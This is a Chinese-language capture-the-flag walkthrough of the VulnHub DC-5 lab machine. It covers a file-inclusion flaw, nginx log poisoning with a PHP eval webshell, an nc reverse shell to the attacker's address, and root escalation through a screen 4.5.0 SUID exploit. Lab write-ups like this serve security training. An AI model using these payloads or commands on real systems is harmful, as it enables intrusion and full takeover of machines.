[DC-5文档](https://www.vulnhub.com/entry/dc-5,314/)

### 信息收集

```
靶机MAC地址：00:0C:29:CB:E4:31
```

**主机扫描**

```shell
netdiscover -r 192.168.80.0/24
```

![image-20230806191613234](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191613234.png)

**端口扫描**

```shell
nmap -sV -p- 192.168.80.139
```

![image-20230806191703134](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191703134.png)

### 漏洞发现

浏览器访问80端口

![image-20230806191746245](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191746245.png)

找找有没有能够利用的地方，在`Contact`里发现了类似提交的 东西

![image-20230806191836140](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191836140.png)

发现点击`Submit`提交后，页面会发生变化

![image-20230806191957268](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806191957268.png)

![image-20230806192005224](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192005224.png)

用bp抓包看看

![image-20230806192123109](./../../../%E6%A1%8C%E9%9D%A2/image-20230806192123109.png)

将抓取到的数据包发送到`Repeater`，点击`Send`查看返回的数据

![image-20230806192231489](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192231489.png)

![image-20230806192247169](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192247169.png)

不断点击，发现footer不断变化，说明这里可能存在一个独立的脚本文件

爆破一下目录看看

```shell
dirsearch -u 192.168.80.139 -i 200
```

![image-20230806192427575](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192427575.png)

浏览器访问这个`http://192.168.80.139/footer.php` 目录

每点击一次页面上的数字就会变

![image-20230806192545346](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192545346.png)

改成文件包含的形式`?file=`发现同样可以

![image-20230806192924313](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806192924313.png)

确定这里存在文件包含漏洞

### 漏洞利用

改变访问路径为`/thankyou.php?file=/etc/passwd` ，可以看到`passwd`文件内容了

![image-20230806193235167](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806193235167.png)

说明了程序代码在处理包含文件的时候没有严格控制。我们可以把访问路径更改为木马文件

```php
 /thankyou<?php @eval($_REQUEST[123]);?>
```

![image-20230806193854240](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806193854240.png)

发现报 `404未找到`的错误

对于配置了`nginx`的网站，无论网站有什么操作，都会被记录在`/var/log/nginx/access.log`和`/var/log/nginx/error.log`里面

```shell
/thankyou.php?file=/var/log/nginx/access.log
```



![image-20230806195156826](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195156826.png)



木马已经上传，利用中国蚁剑来连接访问

```php
http://192.168.80.139/thankyou.php?file=/var/log/nginx/access.log
```

![image-20230806195305274](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195305274.png)

接下来进行`反弹shell`

kali开启监听

```
nc -lvvp 8989 
```



![image-20230806195427316](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195427316.png)

利用中国蚁剑打开虚拟终端，反弹shell到攻击机kali上

```shell
nc -e /bin/bash 192.168.80.141 8989
```

![image-20230806195624840](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195624840.png)

![image-20230806195814105](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195814105.png)

再看kali这边 ，就已经监听到了

![image-20230806195829012](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806195829012.png)



使用python脚本开启交互模式

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20230806200020629](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200020629.png)

查看当前权限，发现只是普通的权限

![image-20230806200057712](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200057712.png)

**下一步就该提权了**

### 权限提升

```shell
find / -user root -perm /4000 2>/dev/null
```

![image-20230806200209010](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200209010.png)

发现`screen-4.5.0`比较可疑，尝试用`searchsploit`搜索是否存在漏洞

再打开一个终端，进行漏洞查找

```shell
searchsploit screen 4.5.0
```

![image-20230806200344787](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200344787.png)

找出`41154.sh`的绝对路径

```shell
searchsploit -p linux/local/41154.sh
```



![image-20230806200639052](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806200639052.png)

查看文件内容

```shell
cat /usr/share/exploitdb/exploits/linux/local/41154.sh 
```

![image-20230806202051823](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806202051823.png)

按照文件的说明，可分为三部分，将第一个框里内容保存为第一文件，名为`libhax.c`，然后使用黄色选取的命令编译，编译结束会生成`libhax.so`文件。

第二个框里内容保存为`rootshell.c`文件，使用黄色选区的命令编译，编译结束后生成`rootshell`文件。

将第三个框里内容保存为第三个文件，保存为run.sh  。 这个名字随意。

第一个文件

<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806201821999.png" alt="image-20230806201821999" style="zoom:33%;" />

第二个文件

<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806202404740.png" alt="image-20230806202404740" style="zoom:33%;" />

第三个文件

<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806202521089.png" alt="image-20230806202521089" style="zoom:33%;" />

把`libhax.c和rootshell.c`拖进 蚁剑

![image-20230806202906263](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806202906263.png)

对`libhax.c和rootshell.c`这两个文件进行编译

![image-20230806203137321](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203137321.png)

进到蚁剑的文件管理里面，刷新一下，就能看到编译好的两个文件了

![image-20230806203244901](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203244901.png)

然后把`run.sh`也拖进蚁剑里来， ==注意是`/tmp`下==

![image-20230806203421888](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203421888.png)

这个时候可以把`libhax.c和rootshell.c`这两个文件删除 ，因为已经编译好了，留他们也没有用了

<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203726204.png" alt="image-20230806203726204" style="zoom:33%;" />

<img src="https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203742381.png" alt="image-20230806203742381" style="zoom:33%;" />

进到kali的python交互shell里，切换到`/tmp`目录下

![image-20230806203854543](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806203854543.png)

运行`run.sh`  输入`bash ./run.sh` 提权

![image-20230806204153258](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806204153258.png)

可以进行`whoami`查看我是谁

![image-20230806204221570](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806204221570.png)

进到`/root`查看有无fl

![image-20230806204344552](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230806204344552.png)

### 总结

```shell
信息收集
	主机发现  netdiscouver
	端口扫描  nmap
	目录爆破  dirsearch
漏洞利用
	bp抓包分析footer.php,有文件包含漏洞
	木马上传，查看日志
	反弹shell
	python交互shell
提权
	find / -user root -perm /4000 2>/dev/null
	searchsploit screen 4.5.0
	libhax.c和rootshell.c文件的编译  run.sh
	bash ./run.sh  提权
```



